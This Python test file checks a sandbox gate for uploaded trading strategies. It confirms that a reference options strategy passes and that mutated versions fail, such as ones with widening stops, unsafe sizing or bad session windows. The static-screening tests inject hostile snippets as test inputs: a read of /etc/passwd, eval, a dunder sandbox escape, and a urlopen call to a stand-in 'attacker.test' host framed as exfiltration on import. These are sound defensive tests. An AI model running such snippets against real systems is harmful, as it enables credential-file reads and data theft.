"""The acceptance gate: does it accept a real strategy, and reject bad ones?

A gate is only worth having if it fails things. Each test here mutates the
reference strategy in one specific way that the deployment documents call out
as dangerous, and asserts the gate catches exactly that.
"""

from __future__ import annotations

import json
import subprocess
import sys
from pathlib import Path

import pytest

BACKEND = Path(__file__).resolve().parent.parent
REFERENCE = (BACKEND / "engine" / "builtin_gk50k.py").read_text()


FUTURE_LINE = "from __future__ import annotations\n"


def with_prelude(snippet: str) -> str:
    """Inject code into the reference module's body.

    It has to go *after* the __future__ import, not before: prepending makes
    every such source a SyntaxError, which the gate would reject for the wrong
    reason and the test would pass without exercising anything.
    """
    assert FUTURE_LINE in REFERENCE
    return REFERENCE.replace(FUTURE_LINE, FUTURE_LINE + snippet, 1)


def run_gate(source: str) -> dict:
    r = subprocess.run(
        [sys.executable, "-m", "engine.gate_runner"],
        input=source, capture_output=True, text=True, cwd=str(BACKEND), timeout=120,
    )
    assert r.stdout, f"gate produced no report; stderr:\n{r.stderr[-2000:]}"
    return json.loads(r.stdout)


def failed_keys(report: dict) -> set[str]:
    return {c["key"] for c in report["checks"] if not c["passed"]}


# ── the reference strategy must pass ─────────────────────────────────────────
def test_the_builtin_strategy_passes_its_own_gate():
    report = run_gate(REFERENCE)
    assert report["passed"], f"reference failed: {[c for c in report['checks'] if not c['passed']]}"
    assert report["failed"] == 0 and report["total"] == 15


def test_builtin_constants_match_the_engine_config():
    """The reference duplicates config by necessity; this catches drift."""
    from engine import builtin_gk50k as B
    from engine import config as C

    for key in (
        "LOT_SIZE", "STRIKE_STEP", "STRIKE_OFFSET", "DONCHIAN_LB", "TARGET_PTS",
        "BE_TRIGGER", "TRAIL_FRAC", "STOP_FRAC", "DEPLOY_FRACTION",
        "PER_TRADE_EQUITY_CAP", "PER_TRADE_RISK_RS", "MAX_LOTS", "MAX_TRADES_DAY",
        "DAILY_LOSS_LIMIT_RS", "WEEKLY_LOSS_LIMIT_RS", "CONSEC_LOSS_HALT",
        "MAX_DRAWDOWN_STOP", "MIN_CAPITAL", "ENTRY_START", "ENTRY_CUTOFF", "FORCE_CLOSE",
    ):
        assert getattr(B, key) == getattr(C, key), f"{key} drifted from engine.config"


def test_the_builtin_signal_agrees_with_the_engine():
    """Same maths, written twice — they must produce the same decisions."""
    import pandas as pd

    from engine import builtin_gk50k as B
    from engine import strategy as S

    for seed in range(20):
        closes = pd.Series([100 + ((i * 7 + seed * 13) % 40) for i in range(200)], dtype="float64")
        view, _, _ = S.donchian(closes)
        expected = {"C": "CE", "P": "PE"}.get(view, "")
        assert B.signal(closes) == expected, f"divergence on seed {seed}"


# ── static screening ─────────────────────────────────────────────────────────
@pytest.mark.parametrize(
    "snippet",
    [
        "import os\n",
        "import subprocess\n",
        "import socket\n",
        "import requests\n",
        "from urllib.request import urlopen\n",
        "_ = open('/etc/passwd').read()\n",
        "_ = eval('2+2')\n",
        "_ = ().__class__.__bases__\n",
    ],
    ids=["os", "subprocess", "socket", "requests", "urllib", "open", "eval", "dunder"],
)
def test_dangerous_source_never_reaches_the_checks(snippet):
    source = with_prelude(snippet)
    report = run_gate(source)
    # The source must be valid Python, so the rejection is the screen doing its
    # job rather than the parser tripping over a misplaced import.
    compile(source, "<candidate>", "exec")
    assert report["passed"] is False
    assert report["error"] == "static screening rejected this source"
    assert report["scan"]["ok"] is False


def test_a_strategy_that_exfiltrates_on_import_is_stopped():
    """The module body runs at import, so this must be caught before loading."""
    evil = with_prelude("import urllib.request as u\nu.urlopen('http://attacker.test/')\n")
    compile(evil, "<candidate>", "exec")
    report = run_gate(evil)
    assert report["passed"] is False and report["scan"]["ok"] is False


# ── contract ─────────────────────────────────────────────────────────────────
def test_a_module_missing_the_interface_is_rejected():
    report = run_gate("NAME = 'incomplete'\n")
    assert report["passed"] is False
    assert "missing from the strategy interface" in report["error"]


def test_a_module_with_no_guards_is_rejected():
    source = REFERENCE.replace(
        '        "max_drawdown_stop": MAX_DRAWDOWN_STOP,\n', ""
    )
    report = run_gate(source)
    assert report["passed"] is False
    assert "max_drawdown_stop" in report["error"]


def test_syntactically_broken_source_is_rejected_cleanly():
    report = run_gate("def broken(:\n    pass\n")
    assert report["passed"] is False
    assert "syntax error" in json.dumps(report["scan"])


# ── behavioural failures the documents call out ──────────────────────────────
def test_a_stop_that_widens_is_caught():
    """Final Checks: the trailing stop must never move downward."""
    source = REFERENCE.replace(
        "    if peak_gain >= TRAIL_FRAC:\n        return -(peak_gain - TRAIL_FRAC)\n"
        "    if peak_gain >= BE_TRIGGER:\n        return 0.0\n    return STOP_FRAC\n",
        "    return STOP_FRAC + peak_gain\n",
    )
    assert source != REFERENCE, "patch did not apply"
    report = run_gate(source)
    assert report["passed"] is False
    assert "stop_monotonic" in failed_keys(report)


def test_a_stop_that_never_trails_is_caught():
    source = REFERENCE.replace(
        "    if peak_gain >= TRAIL_FRAC:\n        return -(peak_gain - TRAIL_FRAC)\n"
        "    if peak_gain >= BE_TRIGGER:\n        return 0.0\n    return STOP_FRAC\n",
        "    return STOP_FRAC\n",
    )
    assert source != REFERENCE
    report = run_gate(source)
    assert report["passed"] is False
    assert "stop_locks_profit" in failed_keys(report)


def test_sizing_that_ignores_zero_equity_is_caught():
    source = REFERENCE.replace(
        "    if premium <= 0 or equity <= 0:\n        return 0\n", ""
    )
    assert source != REFERENCE
    report = run_gate(source)
    assert report["passed"] is False
    assert "size_rejects_degenerate" in failed_keys(report)


def test_sizing_that_ignores_nan_is_caught():
    source = REFERENCE.replace(
        "    if not (math.isfinite(premium) and math.isfinite(equity)):\n        return 0\n", ""
    )
    assert source != REFERENCE
    report = run_gate(source)
    assert report["passed"] is False
    assert "size_rejects_degenerate" in failed_keys(report)


def test_sizing_that_overspends_the_account_is_caught():
    source = REFERENCE.replace(
        "    return max(0, min(by_fraction, by_cap, by_risk, MAX_LOTS))\n",
        "    return 500\n",
    )
    assert source != REFERENCE
    report = run_gate(source)
    assert report["passed"] is False
    assert "size_respects_capital" in failed_keys(report)


def test_a_signal_that_trades_on_nan_is_caught():
    source = REFERENCE.replace(
        "    if not (math.isfinite(cur) and math.isfinite(hi) and math.isfinite(lo)):\n        return \"\"\n",
        "",
    ).replace("    if cur > hi:\n        return \"CE\"\n", "    return \"CE\"\n")
    assert source != REFERENCE
    report = run_gate(source)
    assert report["passed"] is False
    assert "signal_nan" in failed_keys(report)


def test_a_signal_that_crashes_on_empty_input_is_caught():
    source = REFERENCE.replace(
        "    if n < DONCHIAN_LB + 2:\n        return \"\"\n", ""
    )
    assert source != REFERENCE
    report = run_gate(source)
    assert report["passed"] is False
    assert "signal_empty" in failed_keys(report)


def test_force_close_after_the_bell_is_caught():
    source = REFERENCE.replace("FORCE_CLOSE = (15, 10)", "FORCE_CLOSE = (15, 45)")
    assert source != REFERENCE
    report = run_gate(source)
    assert report["passed"] is False
    assert "guards_session_windows" in failed_keys(report)


def test_inverted_session_windows_are_caught():
    source = REFERENCE.replace("ENTRY_START = (10, 15)", "ENTRY_START = (14, 30)")
    assert source != REFERENCE
    report = run_gate(source)
    assert report["passed"] is False
    assert "guards_session_windows" in failed_keys(report)


def test_a_daily_limit_above_the_weekly_limit_is_caught():
    source = REFERENCE.replace("DAILY_LOSS_LIMIT_RS = 12_000.0", "DAILY_LOSS_LIMIT_RS = 90_000.0")
    assert source != REFERENCE
    report = run_gate(source)
    assert report["passed"] is False
    assert "guards_coherent" in failed_keys(report)


def test_an_absurd_drawdown_limit_is_caught():
    source = REFERENCE.replace("MAX_DRAWDOWN_STOP = 0.45", "MAX_DRAWDOWN_STOP = 0.99")
    assert source != REFERENCE
    report = run_gate(source)
    assert report["passed"] is False
    assert "guards_present" in failed_keys(report)


def test_a_nondeterministic_signal_is_caught():
    source = with_prelude("import random\n").replace(
        "    if cur > hi:\n        return \"CE\"\n",
        "    if random.random() < 0.5:\n        return \"CE\"\n    if cur > hi:\n        return \"CE\"\n",
    )
    assert source != REFERENCE
    report = run_gate(source)
    assert report["passed"] is False
    assert "signal_deterministic" in failed_keys(report)


# ── resource containment ─────────────────────────────────────────────────────
def test_an_upload_cannot_write_files():
    """RLIMIT_FSIZE is 0 in the runner, and 'open' is refused statically anyway."""
    report = run_gate(with_prelude("with open('/tmp/pwned', 'w') as f:\n    f.write('x')\n"))
    assert report["passed"] is False
    assert report["scan"]["ok"] is False
    assert not Path("/tmp/pwned").exists()


def test_an_infinite_loop_at_import_is_killed_by_the_cpu_limit():
    """A runaway upload must die on its own, not hang the control plane."""
    import time

    source = with_prelude("while True:\n    pass\n")
    compile(source, "<candidate>", "exec")  # genuinely an infinite loop, not a syntax error

    started = time.monotonic()
    r = subprocess.run(
        [sys.executable, "-m", "engine.gate_runner"],
        input=source, capture_output=True, text=True, cwd=str(BACKEND), timeout=180,
    )
    elapsed = time.monotonic() - started

    # RLIMIT_CPU fires at 20s; allow generous headroom for a loaded machine.
    assert elapsed < 120, f"runner ran {elapsed:.0f}s — the CPU limit did not contain it"
    assert r.returncode != 0, "a killed process must not report success"
    assert not r.stdout.strip(), "a killed process must not emit a passing report"
